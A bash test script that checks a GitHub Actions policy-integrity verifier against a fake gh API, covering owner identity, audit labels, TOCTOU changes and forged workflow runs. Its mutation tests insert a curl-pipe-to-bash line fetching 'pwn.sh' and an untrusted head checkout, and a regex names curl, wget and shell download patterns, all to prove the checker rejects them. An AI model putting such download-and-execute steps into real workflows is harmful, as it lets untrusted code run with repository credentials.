#!/usr/bin/env bash
# Offline RED/GREEN proofs for the base-trusted evaluator and merge-time run
# provenance verifier. The fake gh transport never touches GitHub.
set -euo pipefail

SCRIPT_DIR="$(CDPATH='' cd -- "$(dirname -- "$0")" && pwd)"
REPO_ROOT="$(CDPATH='' cd -- "$SCRIPT_DIR/../.." && pwd)"
VERIFY="$REPO_ROOT/scripts/verify_policy_integrity.sh"
WORKFLOW="$REPO_ROOT/.github/workflows/policy-integrity.yml"
WORKFLOW_BLOB="3ace4c0a0187feb784c9841cd91c8c0c5ca0f137"
SANDBOX="$(mktemp -d "${TMPDIR:-/tmp}/oort-policy-integrity-test.XXXXXX")"
STATE="$SANDBOX/state"
FAKE_GH="$SANDBOX/gh"
HEAD_SHA="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
BASE_SHA="bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
OTHER_SHA="cccccccccccccccccccccccccccccccccccccccc"
AUTHORITY_SHA="dddddddddddddddddddddddddddddddddddddddd"
NEW_AUTHORITY_SHA="eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee"
HEAD_REF="feat/42-policy"
POLICY_OWNER_ID=87296259
ATTACKER_ID=31337
WORKFLOW_ID=777
RUN_ID=9001
RUN_ATTEMPT=2
CHECK_SUITE_ID=8801
APP_ID=15368

cleanup() { rm -rf "$SANDBOX"; }
trap cleanup EXIT INT TERM
mkdir -p "$STATE"

fail() {
  echo "[policy-integrity-test] FAIL: $*" >&2
  exit 1
}

cat >"$FAKE_GH" <<'FAKE_GH'
#!/usr/bin/env bash
set -euo pipefail
STATE="${FAKE_POLICY_STATE:?}"
if [ "${1:-}" = "--version" ]; then
  echo "gh version fake"
  exit 0
fi
[ "${1:-}" = "api" ] || { echo "unexpected fake gh command: $*" >&2; exit 64; }
endpoint="${!#}"
printf '%s\n' "$endpoint" >>"$STATE/calls.log"
if [ -s "$STATE/fail_pattern" ] && printf '%s\n' "$endpoint" | grep -Fq "$(cat "$STATE/fail_pattern")"; then
  echo "simulated API failure: $endpoint" >&2
  exit 1
fi
case "$endpoint" in
  repos/example/oort)
    reads=0
    [ ! -f "$STATE/repo_reads" ] || reads="$(cat "$STATE/repo_reads")"
    reads=$((reads + 1))
    printf '%s\n' "$reads" >"$STATE/repo_reads"
    if [ "$reads" -ge 2 ] && [ -f "$STATE/repo.after.json" ]; then
      cat "$STATE/repo.after.json"
    else
      cat "$STATE/repo.json"
    fi
    ;;
  repos/example/oort/branches/main)
    reads=0
    [ ! -f "$STATE/authority_reads" ] || reads="$(cat "$STATE/authority_reads")"
    reads=$((reads + 1))
    printf '%s\n' "$reads" >"$STATE/authority_reads"
    if [ "$reads" -ge 2 ] && [ -f "$STATE/authority.after.json" ]; then
      cat "$STATE/authority.after.json"
    else
      cat "$STATE/authority.json"
    fi
    ;;
  repos/example/oort/pulls/42)
    reads=0
    [ ! -f "$STATE/pr_reads" ] || reads="$(cat "$STATE/pr_reads")"
    reads=$((reads + 1))
    printf '%s\n' "$reads" >"$STATE/pr_reads"
    if [ "$reads" -ge 2 ] && [ -f "$STATE/pr.after.json" ]; then
      cat "$STATE/pr.after.json"
    else
      cat "$STATE/pr.json"
    fi
    ;;
  repos/example/oort/pulls/42/files\?per_page=100) cat "$STATE/files.json" ;;
  repos/example/oort/issues/42/comments\?per_page=100)
    reads=0
    [ ! -f "$STATE/comments_reads" ] || reads="$(cat "$STATE/comments_reads")"
    reads=$((reads + 1))
    printf '%s\n' "$reads" >"$STATE/comments_reads"
    if [ "$reads" -ge 2 ] && [ -f "$STATE/comments.after.json" ]; then
      cat "$STATE/comments.after.json"
    else
      cat "$STATE/comments.json"
    fi
    ;;
  repos/example/oort/issues/42/events\?per_page=100)
    reads=0
    [ ! -f "$STATE/events_reads" ] || reads="$(cat "$STATE/events_reads")"
    reads=$((reads + 1))
    printf '%s\n' "$reads" >"$STATE/events_reads"
    if [ "$reads" -ge 2 ] && [ -f "$STATE/events.after.json" ]; then
      cat "$STATE/events.after.json"
    else
      cat "$STATE/events.json"
    fi
    ;;
  repos/example/oort/actions/workflows/policy-integrity.yml)
    reads=0
    [ ! -f "$STATE/workflow_reads" ] || reads="$(cat "$STATE/workflow_reads")"
    reads=$((reads + 1))
    printf '%s\n' "$reads" >"$STATE/workflow_reads"
    if [ "$reads" -ge 2 ] && [ -f "$STATE/workflow.after.json" ]; then
      cat "$STATE/workflow.after.json"
    else
      cat "$STATE/workflow.json"
    fi
    ;;
  repos/example/oort/commits/*/statuses\?per_page=100) cat "$STATE/statuses.json" ;;
  repos/example/oort/actions/runs/*/attempts/*/jobs\?per_page=100) cat "$STATE/jobs.json" ;;
  repos/example/oort/actions/runs/*/attempts/*) cat "$STATE/run.json" ;;
  repos/example/oort/check-suites/*) cat "$STATE/suite.json" ;;
  *) echo "unexpected fake gh API endpoint: $endpoint" >&2; exit 64 ;;
esac
FAKE_GH
chmod +x "$FAKE_GH"

write_pr() {
  local author="${1:-kwakseongjae}"
  local changed="${2:-1}"
  local labels="${3:-[]}"
  local head="${4:-$HEAD_SHA}"
  local base="${5:-track/engine}"
  local base_sha="${6:-$BASE_SHA}"
  local author_id="${7:-}"
  local head_ref="${8:-$HEAD_REF}"
  if [ -z "$author_id" ]; then
    if [ "$author" = "kwakseongjae" ]; then
      author_id="$POLICY_OWNER_ID"
    else
      author_id="$ATTACKER_ID"
    fi
  fi
  jq -n \
    --argjson number 42 \
    --arg author "$author" --argjson author_id "$author_id" \
    --argjson changed "$changed" \
    --argjson labels "$labels" \
    --arg head "$head" \
    --arg base "$base" \
    --arg base_sha "$base_sha" --arg head_ref "$head_ref" '{
      number: $number, state: "open", user: {login: $author, id: $author_id},
      head: {ref: $head_ref, sha: $head}, base: {ref: $base, sha: $base_sha},
      changed_files: $changed, labels: $labels
    }' >"$STATE/pr.json"
  cp "$STATE/pr.json" "$STATE/pr.after.json"
}

write_valid_audit() {
  local comment_sha="${1:-$HEAD_SHA}"
  local association="${2:-MEMBER}"
  local actor="${3:-kwakseongjae}"
  local comment_time="${4:-2026-08-12T01:00:00Z}"
  local label_actor="${5:-$actor}"
  local label_time="${6:-2026-08-12T01:00:01Z}"
  local actor_id label_actor_id
  if [ "$actor" = "kwakseongjae" ]; then actor_id="$POLICY_OWNER_ID"; else actor_id="$ATTACKER_ID"; fi
  if [ "$label_actor" = "kwakseongjae" ]; then label_actor_id="$POLICY_OWNER_ID"; else label_actor_id="$ATTACKER_ID"; fi
  jq -n \
    --arg sha "$comment_sha" --arg association "$association" \
    --arg actor "$actor" --argjson actor_id "$actor_id" --arg time "$comment_time" '[[{
      id: 101, user: {login: $actor, id: $actor_id}, author_association: $association,
      body: ("Policy-Integrity-Audit: " + $sha),
      created_at: $time, updated_at: $time
    }]]' >"$STATE/comments.json"
  jq -n \
    --arg actor "$label_actor" --argjson actor_id "$label_actor_id" --arg time "$label_time" '[[{
      id: 201, event: "labeled", actor: {login: $actor, id: $actor_id},
      label: {name: "policy-change-approved"}, created_at: $time
    }]]' >"$STATE/events.json"
  rm -f "$STATE/comments.after.json" "$STATE/events.after.json"
}

reset_runtime() {
  : >"$STATE/calls.log"
  rm -f "$STATE/pr_reads" "$STATE/comments_reads" "$STATE/events_reads" \
    "$STATE/workflow_reads" "$STATE/repo_reads" "$STATE/authority_reads" \
    "$STATE/fail_pattern" \
    "$STATE/workflow.after.json"
}

run_evaluate() {
  reset_runtime
  FAKE_POLICY_STATE="$STATE" MOMO_GH_BIN="$FAKE_GH" \
    "$VERIFY" --evaluate --repo example/oort --pr 42 \
      --expected-head "$HEAD_SHA" --expected-base track/engine \
      --expected-base-sha "$BASE_SHA"
}

expect_evaluate_red() {
  local name="$1"
  local expected="$2"
  reset_runtime
  if FAKE_POLICY_STATE="$STATE" MOMO_GH_BIN="$FAKE_GH" \
    "$VERIFY" --evaluate --repo example/oort --pr 42 \
      --expected-head "$HEAD_SHA" --expected-base track/engine \
      --expected-base-sha "$BASE_SHA" >"$SANDBOX/out" 2>&1; then
    fail "$name passed instead of failing closed"
  fi
  grep -Fq "$expected" "$SANDBOX/out" \
    || fail "$name did not name '$expected': $(cat "$SANDBOX/out")"
}

expect_evaluate_api_red() {
  local name="$1"
  local pattern="$2"
  local expected="$3"
  reset_runtime
  printf '%s\n' "$pattern" >"$STATE/fail_pattern"
  if FAKE_POLICY_STATE="$STATE" MOMO_GH_BIN="$FAKE_GH" \
    "$VERIFY" --evaluate --repo example/oort --pr 42 \
      --expected-head "$HEAD_SHA" --expected-base track/engine \
      --expected-base-sha "$BASE_SHA" >"$SANDBOX/out" 2>&1; then
    fail "$name API error passed instead of failing closed"
  fi
  grep -Fq "$expected" "$SANDBOX/out" \
    || fail "$name did not name '$expected': $(cat "$SANDBOX/out")"
  rm -f "$STATE/fail_pattern"
}

write_valid_provenance() {
  write_pr kwakseongjae 1 '[]'
  printf '%s\n' '[[{"filename":"docs/bootstrap.md","status":"modified"}]]' >"$STATE/files.json"
  printf '%s\n' '[[]]' >"$STATE/comments.json"
  printf '%s\n' '[[]]' >"$STATE/events.json"
  rm -f "$STATE/comments.after.json" "$STATE/events.after.json"
  printf '%s\n' '{"default_branch":"main"}' >"$STATE/repo.json"
  jq -n --arg sha "$AUTHORITY_SHA" '{name: "main", commit: {sha: $sha}}' \
    >"$STATE/authority.json"
  rm -f "$STATE/repo.after.json" "$STATE/authority.after.json"
  jq -n --argjson id "$WORKFLOW_ID" '{
    id: $id, name: "policy-integrity",
    path: ".github/workflows/policy-integrity.yml", state: "active"
  }' >"$STATE/workflow.json"
  jq -n \
    --arg sha "$HEAD_SHA" --argjson run "$RUN_ID" --argjson attempt "$RUN_ATTEMPT" '[[{
      id: 501, sha: $sha, context: "Policy integrity gate", state: "success",
      target_url: ("https://github.com/example/oort/actions/runs/" + ($run|tostring) +
        "/attempts/" + ($attempt|tostring)),
      created_at: "2026-08-12T02:00:00Z",
      creator: {login: "github-actions[bot]"}
    }]]' >"$STATE/statuses.json"
  jq -n \
    --argjson id "$RUN_ID" --argjson attempt "$RUN_ATTEMPT" \
    --argjson workflow "$WORKFLOW_ID" --arg base_sha "$BASE_SHA" \
    --argjson suite "$CHECK_SUITE_ID" --arg head "$HEAD_SHA" \
    --arg authority "$AUTHORITY_SHA" '{
      id: $id, run_attempt: $attempt, workflow_id: $workflow,
      path: ".github/workflows/policy-integrity.yml@main",
      event: "pull_request_target", head_branch: "feat/42-policy",
      head_sha: $head,
      display_title: ("policy-integrity authority=" + $authority + " pr=42 head=" + $head +
        " base=track/engine@" + $base_sha),
      status: "completed", conclusion: "success", check_suite_id: $suite
    }' >"$STATE/run.json"
  jq -n \
    --argjson id "$CHECK_SUITE_ID" --arg head "$HEAD_SHA" \
    --argjson app "$APP_ID" '{
      id: $id, head_sha: $head, app: {id: $app, slug: "github-actions"}
    }' >"$STATE/suite.json"
  jq -n \
    --argjson run "$RUN_ID" --arg head "$HEAD_SHA" '[{
      total_count: 1,
      jobs: [{
        id: 701, run_id: $run, name: "Trusted policy integrity evaluator",
        head_sha: $head, status: "completed", conclusion: "success"
      }]
    }]' >"$STATE/jobs.json"
}

write_valid_policy_provenance() {
  write_valid_provenance
  write_pr kwakseongjae 1 '[{"name":"policy-change-approved"}]'
  printf '%s\n' '[[{"filename":".github/workflows/pr-ci.yml","status":"modified"}]]' >"$STATE/files.json"
  write_valid_audit
}

run_verify() {
  reset_runtime
  FAKE_POLICY_STATE="$STATE" MOMO_GH_BIN="$FAKE_GH" \
    "$VERIFY" --verify-run --repo example/oort --pr 42 \
      --expected-base track/engine --expected-base-sha "$BASE_SHA" \
      --output "$SANDBOX/provenance.json"
}

expect_verify_red() {
  local name="$1"
  local expected="$2"
  reset_runtime
  if FAKE_POLICY_STATE="$STATE" MOMO_GH_BIN="$FAKE_GH" \
    "$VERIFY" --verify-run --repo example/oort --pr 42 \
      --expected-base track/engine --expected-base-sha "$BASE_SHA" \
      >"$SANDBOX/out" 2>&1; then
    fail "$name provenance passed instead of failing closed"
  fi
  grep -Fq "$expected" "$SANDBOX/out" \
    || fail "$name did not name '$expected': $(cat "$SANDBOX/out")"
}

workflow_compliant() {
  local workflow="$1"
  local checkout_block step_count uses_count head_expression_count write_scope_count step_name
  [ "$(git hash-object --no-filters "$workflow")" = "$WORKFLOW_BLOB" ] || return 1
  grep -Fq '  pull_request_target:' "$workflow" || return 1
  grep -Fq '  statuses: write' "$workflow" || return 1
  write_scope_count="$(grep -Ec '^[[:space:]]+[[:alnum:]-]+: write$' "$workflow" || true)"
  [ "$write_scope_count" -eq 1 ] || return 1
  grep -Fq '      - edited' "$workflow" || return 1
  grep -Fq '    name: Trusted policy integrity evaluator' "$workflow" || return 1
  grep -Fq 'context="Policy integrity gate"' "$workflow" || return 1
  # shellcheck disable=SC2016 # Literal GitHub expression contract.
  grep -Fq 'authority=${{ github.workflow_sha }}' "$workflow" || return 1
  # shellcheck disable=SC2016 # Literal workflow shell contract.
  grep -Fq 'target_url="$run_url"' "$workflow" || return 1
  grep -Fq -- '--evaluate' "$workflow" || return 1
  step_count="$(awk '
    /^    steps:$/ { active=1; next }
    active && /^  [[:alnum:]_-]+:$/ { active=0 }
    active && /^      - / { count += 1 }
    END { print count + 0 }
  ' "$workflow")"
  [ "$step_count" -eq 5 ] || return 1
  for step_name in \
    'Checkout only the trusted base evaluator' \
    'Prove checkout is the event base, never the candidate' \
    'Evaluate API metadata with the trusted base policy' \
    'Publish the static context on the exact PR head' \
    'Fail the workflow when policy evaluation failed'; do
    [ "$(grep -Ec "^[[:space:]]+(- )?name: $step_name$" "$workflow" || true)" -eq 1 ] || return 1
  done
  uses_count="$(grep -Ec '^[[:space:]]*(- )?uses:' "$workflow" || true)"
  [ "$uses_count" -eq 1 ] || return 1
  grep -Eq '^[[:space:]]*uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1([[:space:]]|$)' \
    "$workflow" || return 1
  head_expression_count="$(grep -Fc 'github.event.pull_request.head.sha' "$workflow" || true)"
  [ "$head_expression_count" -eq 3 ] || return 1
  checkout_block="$(awk '
    /- name: Checkout only the trusted base evaluator/ { active=1 }
    active && /- name: Prove checkout/ { exit }
    active { print }
  ' "$workflow")"
  # shellcheck disable=SC2016 # Literal GitHub expression; it must not expand here.
  grep -Fq 'ref: ${{ github.event.pull_request.base.sha }}' <<<"$checkout_block" || return 1
  grep -Fq 'fetch-depth: 1' <<<"$checkout_block" || return 1
  grep -Fq 'persist-credentials: false' <<<"$checkout_block" || return 1
  grep -Fq 'sparse-checkout: scripts/verify_policy_integrity.sh' <<<"$checkout_block" || return 1
  grep -Fq 'sparse-checkout-cone-mode: false' <<<"$checkout_block" || return 1
  if grep -Fq 'github.event.pull_request.head' <<<"$checkout_block"; then return 1; fi
  if grep -Eq '(^|[[:space:]])(npm|npx|pnpm|yarn|cargo|make|docker|curl|wget)[[:space:]]|git (fetch|clone|checkout|switch|reset)|gh pr checkout|refs/pull/|github\.head_ref|raw\.githubusercontent\.com|codeload\.github\.com|/(contents|tarball|zipball|git/blobs|git/trees)/|(^|[[:space:]])(ba)?sh[[:space:]]+<\(' "$workflow"; then return 1; fi
  if grep -E '^[[:space:]]*(- )?uses:' "$workflow" \
    | grep -Ev '@[0-9a-f]{40}([[:space:]]|$)' >/dev/null; then
    return 1
  fi
}

# Static candidate-execution absence and mutation proof. This local fixture is
# the evidence for the one initial #1302 track/engine -> main landing chain,
# where the base cannot run a workflow it does not contain. Once main contains
# the workflow and all canonical refs are aligned, the documented gate has no
# further exception.
workflow_compliant "$WORKFLOW" || fail "trusted workflow can execute candidate state or lost its status contract"
cp "$WORKFLOW" "$SANDBOX/candidate-checkout.yml"
sed -i.bak 's/ref: \${{ github.event.pull_request.base.sha }}/ref: ${{ github.event.pull_request.head.sha }}/' \
  "$SANDBOX/candidate-checkout.yml"
if workflow_compliant "$SANDBOX/candidate-checkout.yml"; then
  fail "candidate checkout mutation was accepted"
fi

cp "$WORKFLOW" "$SANDBOX/candidate-second-checkout.yml"
cat >>"$SANDBOX/candidate-second-checkout.yml" <<'SECOND_CHECKOUT'
      - name: Candidate checkout smuggling
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
        with:
          ref: ${{ github.event.pull_request.head.sha }}
SECOND_CHECKOUT
if workflow_compliant "$SANDBOX/candidate-second-checkout.yml"; then
  fail "second candidate checkout mutation was accepted"
fi

cp "$WORKFLOW" "$SANDBOX/candidate-download.yml"
# shellcheck disable=SC2016 # Mutate with literal workflow env references.
sed -i.bak '/bash scripts\/verify_policy_integrity.sh \\/i\
          curl "https://raw.githubusercontent.com/$REPO/$EXPECTED_HEAD_SHA/pwn.sh" | bash' \
  "$SANDBOX/candidate-download.yml"
if workflow_compliant "$SANDBOX/candidate-download.yml"; then
  fail "candidate download/execute mutation was accepted"
fi

cp "$WORKFLOW" "$SANDBOX/extra-write-scope.yml"
sed -i.bak 's/contents: read/contents: write/' "$SANDBOX/extra-write-scope.yml"
if workflow_compliant "$SANDBOX/extra-write-scope.yml"; then
  fail "extra workflow write scope was accepted"
fi

cp "$WORKFLOW" "$SANDBOX/persist-credentials.yml"
sed -i.bak 's/persist-credentials: false/persist-credentials: true/' \
  "$SANDBOX/persist-credentials.yml"
if workflow_compliant "$SANDBOX/persist-credentials.yml"; then
  fail "candidate-accessible checkout credentials were accepted"
fi

# Normal product PR: no audit material is needed and comments/events are not read.
write_pr kwakseongjae 1 '[]'
printf '%s\n' '[[{"filename":"clients/web/src/App.tsx","status":"modified"}]]' >"$STATE/files.json"
run_evaluate >/dev/null || fail "normal product PR failed"
if grep -Eq '/comments\?|/events\?' "$STATE/calls.log"; then
  fail "normal product PR unnecessarily entered protected-policy approval flow"
fi

# A complete result spanning more than one API page remains green.
write_pr kwakseongjae 101 '[]'
jq -n '[[range(0; 100) | {
  filename: ("docs/page-one-" + (.|tostring) + ".md"), status: "modified"
}], [{filename: "docs/page-two.md", status: "modified"}]]' >"$STATE/files.json"
run_evaluate >/dev/null || fail "complete multi-page classification failed"

# Valid label-definition rename-source classification. The approval label's
# canonical definition and its bootstrap writer are themselves policy inputs.
write_pr kwakseongjae 2 '[{"name":"policy-change-approved"}]'
printf '%s\n' '[[{"filename":"docs/renamed-labels.md","previous_filename":".github/labels.json","status":"renamed"},{"filename":"docs/renamed-bootstrap.md","previous_filename":"scripts/github_bootstrap.sh","status":"renamed"}]]' >"$STATE/files.json"
write_valid_audit
run_evaluate >"$SANDBOX/out" || fail "valid rename-source policy audit failed: $(cat "$SANDBOX/out")"
grep -Fq '.github/labels.json' "$SANDBOX/out" \
  || fail "rename source was not classified as protected"
grep -Fq 'scripts/github_bootstrap.sh' "$SANDBOX/out" \
  || fail "bootstrap-writer rename source was not classified as protected"

# The merge/operator contract and exact-base runner are policy inputs too.
write_pr kwakseongjae 11 '[{"name":"policy-change-approved"}]'
jq -n '[[
  {filename: "AGENTS.md", status: "modified"},
  {filename: "CODEX.md", status: "modified"},
  {filename: "CONTRIBUTING.md", status: "modified"},
  {filename: "docs/GITHUB_OPS.md", status: "modified"},
  {filename: "docs/LOCAL_PR_GATE.md", status: "modified"},
  {filename: "docs/TRACKS.md", status: "modified"},
  {filename: "docs/adr/0153-ci-stack-selfhosted-runners.md", status: "modified"},
  {filename: "scripts/check_branch_skew.sh", status: "modified"},
  {filename: "scripts/verify_policy_integrity_from_base.sh", status: "modified"},
  {filename: "scripts/tests/test_license_gate.sh", status: "modified"},
  {filename: "scripts/tests/test_trusted_policy_runner.sh", status: "modified"}
]]' >"$STATE/files.json"
write_valid_audit
run_evaluate >"$SANDBOX/out" || fail "protected merge-contract manifest failed: $(cat "$SANDBOX/out")"
for protected_contract in AGENTS.md CODEX.md CONTRIBUTING.md docs/GITHUB_OPS.md \
  docs/LOCAL_PR_GATE.md docs/TRACKS.md docs/adr/0153-ci-stack-selfhosted-runners.md \
  scripts/verify_policy_integrity_from_base.sh \
  scripts/check_branch_skew.sh scripts/tests/test_license_gate.sh \
  scripts/tests/test_trusted_policy_runner.sh; do
  grep -Fxq "[policy-integrity]   $protected_contract" "$SANDBOX/out" \
    || fail "protected contract was not classified: $protected_contract"
done

# Candidate workflow self-change without owner-authorized evidence is red.
write_pr attacker 1 '[]'
printf '%s\n' '[[{"filename":".github/workflows/policy-integrity.yml","status":"modified"}]]' >"$STATE/files.json"
expect_evaluate_red candidate-self-change 'protected policy changes require designated policy-owner author kwakseongjae/87296259'

write_pr attacker 1 '[]'
printf '%s\n' '[[{"filename":"scripts/github_bootstrap.sh","status":"modified"}]]' >"$STATE/files.json"
expect_evaluate_red label-bootstrap-self-change 'protected policy changes require designated policy-owner author kwakseongjae/87296259'

# API completeness/shape and transport failures are fail-closed.
write_pr kwakseongjae 3000 '[]'
printf '%s\n' '[[]]' >"$STATE/files.json"
expect_evaluate_red api-cap '3,000-file GitHub API cap'

write_pr kwakseongjae 2 '[]'
printf '%s\n' '[[{"filename":"docs/one.md","status":"modified"}]]' >"$STATE/files.json"
expect_evaluate_red incomplete 'incomplete or duplicate changed-files response'

write_pr kwakseongjae 2 '[]'
printf '%s\n' '[[{"filename":"docs/one.md","status":"modified"},{"filename":"docs/one.md","status":"modified"}]]' >"$STATE/files.json"
expect_evaluate_red duplicate-files 'incomplete or duplicate changed-files response'

write_pr kwakseongjae 1 '[]'
printf '%s\n' '[[{"filename":"docs/renamed.md","status":"renamed"}]]' >"$STATE/files.json"
expect_evaluate_red renamed-without-source 'changed-files response has an invalid or ambiguous shape'

printf '%s\n' '{"number":42,"state":"open","changed_files":"one"}' >"$STATE/pr.json"
cp "$STATE/pr.json" "$STATE/pr.after.json"
expect_evaluate_red malformed-pr 'invalid shape'

write_pr kwakseongjae 1 '[]'
printf '%s\n' '[[{"filename":17,"status":"modified"}]]' >"$STATE/files.json"
expect_evaluate_red malformed-files 'invalid or ambiguous shape'

write_pr kwakseongjae 1 '[]'
printf '%s\n' '[[{"filename":"docs/one.md","status":"modified"}]]' >"$STATE/files.json"
expect_evaluate_api_red files-api '/files?per_page=100' 'changed-file classification is unavailable'

# Exact author/comment/label/head audit failures.
write_pr kwakseongjae 1 '[{"name":"policy-change-approved"}]'
printf '%s\n' '[[{"filename":"scripts/local_gate.sh","status":"modified"}]]' >"$STATE/files.json"
write_valid_audit "$OTHER_SHA"
expect_evaluate_red wrong-comment-sha 'missing designated policy-owner audit comment for exact current head'

write_valid_audit "$HEAD_SHA" MEMBER attacker
expect_evaluate_red wrong-comment-actor 'missing designated policy-owner audit comment for exact current head'

write_valid_audit "$HEAD_SHA" MEMBER kwakseongjae '2026-08-12T01:00:02Z' attacker '2026-08-12T01:00:03Z'
expect_evaluate_red wrong-label-actor 'was not applied by the same designated policy owner'

write_valid_audit "$HEAD_SHA" MEMBER kwakseongjae '2026-08-12T01:00:02Z' kwakseongjae '2026-08-12T01:00:01Z'
expect_evaluate_red label-before-comment 'was not applied by the same designated policy owner'

# Stable numeric identity is part of the designated-owner contract; a reused
# login string cannot authorize policy changes.
write_pr kwakseongjae 1 '[{"name":"policy-change-approved"}]' "$HEAD_SHA" track/engine "$BASE_SHA" "$ATTACKER_ID"
write_valid_audit
expect_evaluate_red wrong-author-id 'designated policy-owner author kwakseongjae/87296259'
write_pr kwakseongjae 1 '[{"name":"policy-change-approved"}]'
write_valid_audit
jq --argjson attacker "$ATTACKER_ID" '.[0][0].user.id = $attacker' \
  "$STATE/comments.json" >"$STATE/tmp.json"
mv "$STATE/tmp.json" "$STATE/comments.json"
expect_evaluate_red wrong-comment-id 'missing designated policy-owner audit comment'
write_valid_audit
jq --argjson attacker "$ATTACKER_ID" '.[0][0].actor.id = $attacker' \
  "$STATE/events.json" >"$STATE/tmp.json"
mv "$STATE/tmp.json" "$STATE/events.json"
expect_evaluate_red wrong-label-id 'was not applied by the same designated policy owner'

# The last transition, rather than any historical owner label event, defines
# current label provenance.
write_valid_audit
jq --argjson attacker "$ATTACKER_ID" '.[0] += [
  {id: 202, event: "unlabeled", actor: {login: "attacker", id: $attacker},
   label: {name: "policy-change-approved"}, created_at: "2026-08-12T01:00:02Z"},
  {id: 203, event: "labeled", actor: {login: "attacker", id: $attacker},
   label: {name: "policy-change-approved"}, created_at: "2026-08-12T01:00:03Z"}
]' "$STATE/events.json" >"$STATE/tmp.json"
mv "$STATE/tmp.json" "$STATE/events.json"
expect_evaluate_red nonowner-relabel 'latest policy-change-approved transition was not applied by the same designated policy owner'

write_valid_audit
jq --argjson owner "$POLICY_OWNER_ID" '.[0] += [
  {id: 202, event: "unlabeled", actor: {login: "kwakseongjae", id: $owner},
   label: {name: "policy-change-approved"}, created_at: "2026-08-12T01:00:02Z"}
]' "$STATE/events.json" >"$STATE/tmp.json"
mv "$STATE/tmp.json" "$STATE/events.json"
expect_evaluate_red later-unlabel-metadata-mismatch 'latest policy-change-approved transition was not applied by the same designated policy owner'

# Evidence is read twice around a bound PR read. Even a still-valid edited
# comment or same-owner relabel must not cross that window unnoticed.
write_valid_audit "$HEAD_SHA" MEMBER kwakseongjae '2026-08-12T01:00:00Z' kwakseongjae '2026-08-12T01:00:04Z'
jq '.[0][0].body += "\nclarified" | .[0][0].updated_at = "2026-08-12T01:00:02Z"' \
  "$STATE/comments.json" >"$STATE/comments.after.json"
expect_evaluate_red comment-edit-toctou 'selected policy audit comment changed during evaluation'

write_valid_audit
jq --argjson owner "$POLICY_OWNER_ID" '.[0] += [
  {id: 202, event: "unlabeled", actor: {login: "kwakseongjae", id: $owner},
   label: {name: "policy-change-approved"}, created_at: "2026-08-12T01:00:02Z"},
  {id: 203, event: "labeled", actor: {login: "kwakseongjae", id: $owner},
   label: {name: "policy-change-approved"}, created_at: "2026-08-12T01:00:03Z"}
]' "$STATE/events.json" >"$STATE/events.after.json"
expect_evaluate_red label-event-toctou 'latest policy label transition changed during evaluation'

write_valid_audit
expect_evaluate_api_red comments-api '/comments?per_page=100' 'policy audit comments are unavailable'
write_valid_audit
expect_evaluate_api_red events-api '/events?per_page=100' 'policy label audit events are unavailable'

write_valid_audit
write_pr kwakseongjae 1 '[]'
expect_evaluate_red missing-current-label 'required current label is missing'

write_pr kwakseongjae 1 '[{"name":"policy-change-approved"}]'
write_valid_audit
jq --arg head "$OTHER_SHA" '.head.sha = $head' "$STATE/pr.json" >"$STATE/pr.after.json"
expect_evaluate_red head-toctou 'PR head does not match the trusted event head'

# Happy-path provenance, including workflow/check-suite App identity output.
write_valid_provenance
run_verify >/dev/null || fail "valid trusted run provenance failed"
jq -e \
  --arg head "$HEAD_SHA" --arg base_sha "$BASE_SHA" \
  --arg authority "$AUTHORITY_SHA" \
  --argjson workflow "$WORKFLOW_ID" --argjson run "$RUN_ID" \
  --argjson attempt "$RUN_ATTEMPT" --argjson app "$APP_ID" '
  .head_sha == $head and .base_ref == "track/engine" and
  .base_sha == $base_sha and .authority_ref == "main" and
  .authority_sha == $authority and .workflow_id == $workflow and
  .workflow_path == ".github/workflows/policy-integrity.yml" and
  .workflow_run_path == ".github/workflows/policy-integrity.yml@main" and
  .event == "pull_request_target" and .run_id == $run and
  .run_attempt == $attempt and .app_id == $app
' "$SANDBOX/provenance.json" >/dev/null || fail "provenance output lost an exact binding"

# GitHub has returned both the bare canonical workflow path in live run-attempt
# responses and the documented path@ref shape. Both bind to the same trusted
# workflow here because default authority and run-name workflow_sha are
# independently exact-main-bound.
write_valid_provenance
jq '.path = ".github/workflows/policy-integrity.yml"' \
  "$STATE/run.json" >"$STATE/tmp.json"
mv "$STATE/tmp.json" "$STATE/run.json"
run_verify >/dev/null || fail "bare canonical workflow run path was rejected"
jq -e '.workflow_run_path == ".github/workflows/policy-integrity.yml"' \
  "$SANDBOX/provenance.json" >/dev/null \
  || fail "bare workflow run path was not recorded in provenance"

# A same-name GitHub Actions status pointing at a different workflow is forged.
write_valid_provenance
jq '.workflow_id = 778' "$STATE/run.json" >"$STATE/tmp.json"
mv "$STATE/tmp.json" "$STATE/run.json"
expect_verify_red forged-same-name 'does not match the exact trusted workflow/event/attempt/current head-base binding'

# Actions run-attempt `.path` includes the workflow authority ref suffix. A
# genuine workflow ID on a non-main ref is not the current trusted authority.
write_valid_provenance
jq '.path = ".github/workflows/policy-integrity.yml@track/engine"' \
  "$STATE/run.json" >"$STATE/tmp.json"
mv "$STATE/tmp.json" "$STATE/run.json"
expect_verify_red wrong-workflow-authority-ref 'does not match the exact trusted workflow/event/attempt/current head-base binding'

# A genuine trusted run for another head/PR cannot be recycled as target_url.
write_valid_provenance
jq --arg other "$OTHER_SHA" '.display_title = ("policy-integrity pr=42 head=" + $other + " base=track/engine@" + .head_sha)' \
  "$STATE/run.json" >"$STATE/tmp.json"
mv "$STATE/tmp.json" "$STATE/run.json"
expect_verify_red reused-other-head 'does not match the exact trusted workflow/event/attempt/current head-base binding'

write_valid_provenance
jq '.display_title = (.display_title | sub("pr=42"; "pr=41"))' \
  "$STATE/run.json" >"$STATE/tmp.json"
mv "$STATE/tmp.json" "$STATE/run.json"
expect_verify_red reused-other-pr 'does not match the exact trusted workflow/event/attempt/current head-base binding'

# Bootstrap mappings must bind the PR to the exact target branch/base SHA.
write_valid_provenance
reset_runtime
if FAKE_POLICY_STATE="$STATE" MOMO_GH_BIN="$FAKE_GH" \
  "$VERIFY" --verify-run --repo example/oort --pr 42 \
    --expected-base main --expected-base-sha "$BASE_SHA" >"$SANDBOX/out" 2>&1; then
  fail "wrong-base bootstrap PR passed"
fi
grep -Fq 'PR base does not match the expected canonical branch' "$SANDBOX/out" \
  || fail "wrong-base bootstrap PR was not named"

write_valid_provenance
printf '%s\n' '[[]]' >"$STATE/statuses.json"
